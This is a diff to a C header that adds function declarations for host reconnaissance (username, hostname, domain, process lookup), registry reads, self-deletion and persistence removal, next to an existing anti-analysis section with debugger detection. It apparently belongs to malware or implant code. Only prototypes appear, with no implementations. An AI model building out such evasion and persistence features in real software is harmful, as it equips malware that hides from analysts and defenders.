@@ -40,6 +40,36 @@ uint32_t get_tick_count(void);
 int get_process_id(void);
 int get_cpu_count(void);
 uint64_t get_memory_size(void);
+uint64_t get_system_uptime(void);
+int count_running_processes(void);
+void get_username(char* buffer, size_t size);
+void get_hostname(char* buffer, size_t size);
+void get_domain(char* buffer, size_t size);
+void* resolve_hostname(const char* hostname);
+int find_process_by_name(const char* name);
+uint32_t get_random_hardware(void);
+char* str_cpy(char* dest, const char* src, size_t n);
+
+// Time structures
+typedef struct {
+    int year;
+    int month;
+    int day;
+    int hour;
+    int minute;
+    int second;
+    int day_of_week;  // 0 = Sunday, 1 = Monday, etc.
+} system_time_t;
+
+void get_local_time(system_time_t* st);
+
+// Registry operations (Windows only)
+int read_registry_string(void* hkey, const char* subkey, const char* value_name);
+void get_system_info_basic(void);
+
+// Self-management
+void delete_self(void);
+void remove_persistence(void);
 
 // Anti-analysis
 int detect_debugger(void);
